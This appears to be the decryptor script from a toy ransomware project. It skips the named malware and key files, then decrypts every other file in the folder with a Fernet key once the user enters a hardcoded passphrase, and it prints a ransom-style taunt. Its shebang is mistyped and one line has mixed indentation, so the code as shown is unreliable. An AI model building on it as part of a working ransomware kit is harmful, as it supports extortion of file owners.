 #1/usr/bin/env python3

import os 
from cryptography.fernet import Fernet

# find out files for encrypted

files = []
for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files) 

with open("thekey.key" , "rb") as key:
	secretkey = key.read()

secretphrase = "r3dhulk"
user_phrase = input("Enter The Key for Decryption : ")

if user_phrase == secretphrase :
	for file in files:
		with open(file, "rb") as thefile:
 			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Your Files Are Decrypted. Never mess up with malware in future " )
else : 
	print("Sorry, wrong secretphrase")
